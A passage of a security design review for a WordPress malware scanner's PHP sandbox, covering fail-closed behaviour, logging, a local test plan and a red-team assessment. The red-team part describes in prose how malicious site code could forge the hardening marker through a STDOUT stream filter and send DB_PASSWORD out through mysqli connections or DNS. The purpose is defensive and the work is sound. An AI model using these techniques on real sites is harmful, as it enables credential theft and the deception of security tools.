nonce, checking `php_ini_scanned_files()` and `function_exists`. That is the only assertion an in-process
attacker cannot touch. Treat the in-band per-call marker as corroboration.

### Fail closed, and what "closed" costs

**Abort the PHP-executing class of units. Do not abort the scan. Do not offer an override.**

Every failure mode above is deterministic and local — missing directory, bad write, unreadable file,
environment stripped by an upgrade, relative path. Not one is transient. "Warn and continue" therefore
buys no availability; it means every subsequent run is also unhardened, silently, for weeks. That is
verbatim the outcome you already have.

The proportionality objection — "single-user tool, an aborted scan is a nuisance" — dissolves once the
84-unit classification lands. If only FS-MISMATCH genuinely requires PHP execution, failing closed costs
one unit out of 84. So:

1. `eval.ts` returns `HARDENING_NOT_IN_EFFECT: <reasons>` as an error result.
2. The agent does not retry the unit and sets `hardening: 'failed'` on the run.
3. Units requiring PHP execution are skipped and recorded as `SKIPPED (sandbox unconfined)`.
4. The rest of the sweep proceeds.
5. The report header carries the degradation, and the existing "Coverage Gaps (Blind Spots)" section
   (`agent.js:3240-3251`) gains an explicit entry naming what was not attempted.

The only retry worth having is for a torn write: rewrite atomically, retry once, then stop.

### Logging

Log what the child process *reported*, never what the parent *attempted*. Log hardening from the
verification branch in `eval.ts` — the only place that has evidence — not from the write path.

```
[Tier 2] sandbox=<name> hardening=verified profile=analysis nonce=a1b2c3d4
         asserted_by=prologue+preflight blocked=62fn,allow_url_fopen,ffi
         open_basedir=on calls_hardened=31/31
[Tier 2] sandbox=<name> hardening=FAILED nonce=a1b2c3d4
         reasons=curl_exec,shell_exec,ini-not-parsed php_units_skipped=FS-MISMATCH
```

The nonce is the join key across the `.ini` filename, the prologue and the log. `calls_hardened=N/M` is
what catches partial coverage, which is what a mid-run environment regression looks like.

Two logs that would have caught the upgrade risk early: at addon startup, one
`wpCliRun(siteId, ['eval', 'echo getenv("X");'], { env: { X: '1' } })` against any running site, logged
once, asserting that `opts.env` still survives. And when hardening is requested, log the SHA-256 of the
ini bytes alongside the nonce so a torn write is visible in retrospect.

### The fifteen-minute end-to-end test

The existing S1 canary and harness are reusable. `run.sh` reconstructs Local's exact WP-CLI command line
and takes a scan directory as `$1`.

**Step 0 (30 s) — listener.** Bind a logging HTTP server on `127.0.0.1:19999` appending request paths to
`/tmp/sentinel-s1/hits.log`.

**Step 1 (1 min) — baseline.** The canary uses `global $rows` in `record()` and `wp eval` runs in
function scope, so you must prepend `global $rows;` or every row silently vanishes:

```bash
./run.sh 'global $rows; include "/tmp/sentinel-s1/canary.php";' --skip-plugins --skip-themes
```

Expect `OPEN EGRESS CHANNELS: 8 of 8`.

**Step 2 (2 min) — hardened.** Write Profile A into `/tmp/h/nexus-TESTNONCE.ini`, then
`SCANDIR=/tmp/h ./run.sh …` the same canary. Expect `0 of 8`, and no new lines in `hits.log`.

**Step 3 (2 min) — FS-MISMATCH under Profile B, plugins loaded.** Drop the skip flags and run the
`usermeta` COUNT against `count(get_users(['role'=>'administrator']))` plus
`function_exists('shell_exec')`. Measured: `raw=1 api=1 plugins=5 shell_gone=YES`.

**Step 4 (3 min) — the assertion, four branches.** Run the prologue with `__NONCE__` replaced by
`TESTNONCE`, four times: (A) correct scan directory; (B) no `SCANDIR`; (C) `SCANDIR` at a directory whose
ini starts with `{{{garbage`; (D) `SCANDIR` at a directory with a correct ini named `nexus-WRONG.ini`.
Expect `OK` / `FAIL:…,ini-not-parsed` / same / `FAIL:ini-not-parsed`, and **exit 0 in all four**.

**Step 5 (4 min) — through the addon, not the harness.** Add `env?: NodeJS.ProcessEnv` to `WpCliRunOpts`,
add `harden` to `eval.ts`, `npm run build`, `./dev-reload.sh`. Then confirm the CLI stays unhardened
(`nexus wp t4@local eval 'echo getenv("PHP_INI_SCAN_DIR")."|".php_ini_scanned_files();'` should be
empty), and exercise the MCP tool with `harden` set. **This is the only step that proves `opts.env`
actually crosses `svc('wpCli').run` in the live process** — every step above proves PHP's behaviour, not
the plumbing.

**Step 6 (1 min) — negative control.**
`grep -n "opts?.env" ~/development/wpengine/flywheel-local/app/main/sites/WpCliService.ts` and confirm it
is still line 146, before `PHPRC` on 147.

---

## Red team

Ranked by realistic risk to you, given the stated threat model of a live compromised site that may leak
credentials.

**1. The `execute-sandbox` shim bypasses the whole mechanism.** `ipc-handlers.ts:4902-4917` is a copy,
not a delegation. No `env`, no scan directory, no prologue, no marker check. It is the path that executes
approved remediation commands, it is unaudited, and a `harden` parameter on `eval.ts` never reaches it.
Highest risk because it needs no attacker skill at all — it is just a hole, and it would sit under a
report header claiming the sandbox was hardened. **Fix it in the same change or the hardening is
cosmetic on the highest-risk path.**

**2. Report poisoning.** Every `wp_eval`-based unit returns through stdout, and the mu-plugin runs first
in the same process. `stream_filter_append` on `STDOUT` is not in any blocklist and survives Profile A
(verified: `can_append_filter=YES`). So attacker code can rewrite any unit's JSON — not only hiding
findings but *injecting* them, naming a legitimate file as malicious, or shaping a path that flows into
the remediation checklist a human then approves against production. Higher value to an attacker than
exfiltration, and the ini does nothing about it. The defence is orthogonal: units whose output gates a
human action must not have their transport under attacker control, i.e. read bytes and SQL from Node.

**3. Forging the assertion marker.** Demonstrated end to end. The mu-plugin appends a stream filter to
`STDOUT` that matches the static `__NEXUS_HARDEN_FAIL__` prefix, **learns the nonce from the FAIL string
itself**, and rewrites it into a valid `__NEXUS_HARDEN_OK__<nonce>`. Result: `eval.ts` reports HARDENED
while nothing is in effect. The nonce defeats an external forger, not an in-process one, and
`fwrite(STDOUT)` bypasses `ob_start` but not a stream filter on the STDOUT resource. This pays off
exactly when delivery independently fails — the filter is a no-op otherwise. **Only the out-of-band
`php -r` preflight (no WordPress bootstrap, therefore no mu-plugin) is not defeatable this way.** Adding
`stream_filter_register`/`stream_filter_append` to the blocklist raises the bar without closing it.

**4. Credential exfiltration via `mysqli_real_connect`, and DNS on the same primitive.** `wp-config.php`
is inside the webroot, which `open_basedir` must allow. Read `DB_PASSWORD`, base32-encode it into the
username field, connect to an attacker host. Confirmed under Profile A. Ten lines of PHP, no exotic
technique. This is precisely the thing the mechanism exists to prevent, and it is the one it cannot
close.

**5. FS-MISMATCH evasion.** The unit must run with plugins loaded, so the malware can detect the sentinel
(`defined('WP_CLI')`, or just "an admin-counting query") and behave for the duration of the scan: stop
filtering `pre_get_users`, let the counts match, resume afterwards. Structural — no ini profile changes
it. This is the inherent limit of executing attacker code to detect attacker code.

**6. Total silent disarmament.** All eight controls live in one file delivered by one environment
variable, and there are at least six ways that file silently does not apply, plus the Local-upgrade risk
at `WpCliService.ts:144-151`. There is no graceful degradation: it is maximal containment or none. An
attacker does not need to trigger it — pre-positioning the marker forgery and the exfil payload means
they pay off whenever it happens on its own.

**What genuinely holds.** Function-based egress (curl, fsockopen, stream sockets, ext/sockets,
URL-as-file) is dead. `ffi.enable=0` is `PHP_INI_SYSTEM` and closes the libc bypass. `disable_classes`
hollows `SoapClient` and `PDO` with no packets. `allow_url_fopen=Off` kills the URL wrapper family
including XXE and XSLT remote fetch. HTTP to Local's control plane on 4000 and 13000 cannot be formed.
And `open_basedir` protects `agent.js` itself — conditional on the delivery not having failed, which is
risk 6.

---

## Should you build it?

**No. Not now. Port the units to Node instead, and fix FS-MISMATCH first — it is broken in a way that
makes the entire hardening effort moot.**

`agent.js:2138`:

```php
WHERE m.meta_key = 'wp_capabilities' AND m.meta_value LIKE '%administrator%'
```

The prefix is hardcoded, on the line immediately after `global $wpdb;`, while the same query interpolates
`{$wpdb->usermeta}` correctly two tokens earlier. On any site with a non-default table prefix, `$count`
is `0`. Then `:2146`:

```js
if (counts.db && counts.wp && counts.db !== counts.wp)
```

`0` is falsy, so the branch is unreachable, and the `catch {}` at `:2156` means nothing is logged. The
same truthiness gate also kills the check in its strongest case even with the prefix repaired — an
attacker who hides *all* admins yields `wp === 0`, also falsy, also silent. FS-MISMATCH returns "clean"
for every non-`wp_` site and for the total-hiding case. It has never detected anything, and as written it
cannot.

So the proposal reduces to: build per-invocation ini materialisation, a nonce protocol, an in-band PHP
prologue, an out-of-band preflight, a `harden` enum, a bridge type change, a scan-directory lifecycle,
and a fail-closed path through two divergent call sites — roughly 150 lines of new security-critical
surface — to contain the blast radius of a dead branch. Two lines fix the branch.

Four more reasons, in descending strength:

**The port delivers strictly more, sooner.** The 84-unit classification says everything except
FS-MISMATCH answers from bytes, SQL, or Node-side probes. Porting removes the PHP-execution surface
*entirely* for 83 units — not "reduces it to one residual TCP channel", removes it. A blocklist is
strictly worse than absence. The ports are mechanical: `md5_file`, `glob`, a MySQL connection from Node.
No new abstraction, no assertion protocol, no dependence on `WpCliService.ts:146` keeping its position.

**On your specific goal the mechanism scores zero.** You want to stop a compromised site leaking
credentials. Under the best profile that still boots WordPress, `mysqli_real_connect` opens arbitrary TCP
and transmits the username field, and resolves an attacker-controlled hostname even with every DNS
function disabled, because both happen in C inside the extension WordPress requires. Nine channels closed,
and the one left open does exactly the thing you are trying to prevent.

**Partial containment is how this code got into trouble.** The sentinel's characteristic failure is a
clean verdict that overstates what was checked. The most likely legacy of this mechanism is a second one:
a header reading `Sandbox hardening: verified (analysis, 62 functions)` on a run where the mu-plugin
detonated at bootstrap on all 32 `wp_eval` calls and exfiltrated over mysqli — every word of which is
true and the impression false. Replacing a lie with a narrower, better-instrumented, more credible lie is
not obviously progress.

**The shelf life is the port, and the port is the actual work.** The mechanism is load-bearing only for
units that call `wp_eval`, and the plan is to remove those units. There is no schedule on which building
this first is optimal, because it does not accelerate the port and the port obsoletes it.

### What to do this week instead

1. **Delete `agent.js:1757-1786`.** It removes up to 30 seconds per run, removes the restart that was
   itself the cause of failure, and removes a log line that lies. Claiming nothing is more honest than
   claiming this. One afternoon.
2. **Fix FS-MISMATCH:** interpolate `{$wpdb->prefix}capabilities`, and replace the truthiness gate with
   an explicit three-way outcome — `errored`, `matched`, `mismatch` — so a fatal or a parse failure can
   never read as "clean". Two lines plus a small refactor.
3. **Read `wp-content/mu-plugins` as bytes from Node before any `wp_eval`, and refuse to eval if anything
   unexpected is there.** This addresses detonation rather than its blast radius, is cheaper than the
   scan directory, and is the single highest-value change on this list.
4. **Port `runElfStrings`, collector 6, checklist step 6, and `agent.js:3038` to Node.** Check first
   whether `:1050` is already dead (`command -v wp` in the WP-CLI environment).
5. **Route `nexus:sentinel:execute-sandbox` through `registry.call('wp_eval', …)`** and delete the shim
   at `ipc-handlers.ts:4902-4917`. Closes the audit gap for free.

### When to revisit

Build the scan directory only if, after steps 1–5, a unit still genuinely requires executing site-derived
PHP, and it must run before the remaining ports land. If that happens, the design above is correct and
implementable in a day, addon-only — but ship it with the out-of-band preflight, both profiles, the
fail-closed path, `execute-sandbox` already routed through `eval.ts`, and a report that states the
residual honestly:

> mysqli TCP and DNS exfiltration remain open under all profiles; FS-MISMATCH detection is defeatable by
> environment-aware malware.

Not "0 of 8".
